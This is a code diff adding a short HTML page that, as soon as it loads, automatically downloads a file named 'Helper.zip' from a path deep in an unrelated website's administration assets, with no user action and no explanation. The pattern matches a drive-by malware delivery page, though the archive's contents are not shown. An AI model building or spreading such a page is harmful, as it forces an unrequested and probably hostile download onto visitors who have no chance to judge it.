@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File</title>
+</head>
+<body>
+    <h1>Downloading your file...</h1>
+
+    <script>
+        // Function to start the download
+        function startDownload() {
+            var link = document.createElement('a');
+            link.href = 'http://kstapsara.vn/public/assets/administration/mainstructure/js/wow/Helper.zip';
+            link.download = 'Helper.zip';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Automatically start the download when the page loads
+        window.onload = startDownload;
+    </script>
+</body>
+</html>
